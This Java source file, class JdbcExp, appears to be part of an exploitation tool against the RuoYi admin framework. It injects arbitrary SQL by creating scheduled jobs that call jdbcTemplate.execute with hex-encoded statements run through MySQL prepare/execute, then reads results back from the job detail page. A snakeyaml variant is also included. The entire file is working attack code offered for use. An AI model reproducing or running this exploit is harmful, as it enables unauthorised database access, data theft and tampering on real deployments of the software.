package com.ruoyi.exp;

import com.ruoyi.global.Config;
import com.ruoyi.util.HexUtil;
import com.ruoyi.util.JobUtil;

import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class JdbcExp {

    public static String jdbcSql = "update sys_job set invoke_target=({sql}) where job_id={jobId};";
    public static String jdbcPayloadSet = "jdbcTemplate.execute(\"set @{variable} = 0x{hexSql};\")";
    public static String jdbcPayloadPrepare = "jdbcTemplate.execute(\"prepare {variable} from @{variable};\")";
    public static String jdbcPayloadExecute = "jdbcTemplate.execute(\"execute {variable};\")";
    public static String invokeTargetPatternStr = "调用目标字符串：[\\w\\W]*?div class=\"form-control-static\">(.*?)</div>";
    public static String jdbcPayloadYaml = "jdbcTemplate.execute(\"{sql}\")";


    public static String variable;

    // 通过将返回值写入jobInvokeTarget得到回显结果
    public static String getResult() {
        String resp = Config.get("/monitor/job/detail/" + Config.jobId);
        Pattern invokeTargetPattern = Pattern.compile(invokeTargetPatternStr);
        Matcher matcher = invokeTargetPattern.matcher(resp);
        String result = "";
        if (matcher.find()) {
            result = matcher.group(1);
        }
        return result;
    }

    public static String sqlExp(String sql, String mode) {
        JobUtil.clearLog();
        int failCount = 0;
        try {
            variable = "a" + new Random().nextInt(10);
            String updateSql;
            if (mode.equals("update")) {
                if (!sql.endsWith(";")) {
                    sql = sql+";";
                }
                updateSql = sql;
            } else {
                if (sql.endsWith(";")) {
                    sql = sql.replace(";", "");
                }
                updateSql = jdbcSql.replace("{sql}", sql).replace("{jobId}", Config.jobId);
            }
            if (mode.equals("snakeyaml")) {
                JobUtil.expJob(jdbcPayloadYaml.replace("{sql}", updateSql.replace("(", "").replace(")", "")));
                return JobUtil.runJob();
            }
            String hexSql = HexUtil.string2HexString(updateSql);
            String setInvoke = jdbcPayloadSet.replace("{hexSql}", hexSql).replace("{variable}", variable);
            while (!JobUtil.expJob(setInvoke).isEmpty() & failCount<10) {
                failCount++;
            }
            failCount = 0;
            while (!JobUtil.expJob(jdbcPayloadPrepare.replace("{variable}", variable)).isEmpty() & failCount<10) {
                failCount++;
            }
            failCount = 0;
            while (!JobUtil.expJob(jdbcPayloadExecute.replace("{variable}", variable)).isEmpty() & failCount<10) {
                failCount++;
            }
            return getResult();
        } catch (Exception e) {
            return "";
        }
    }
}
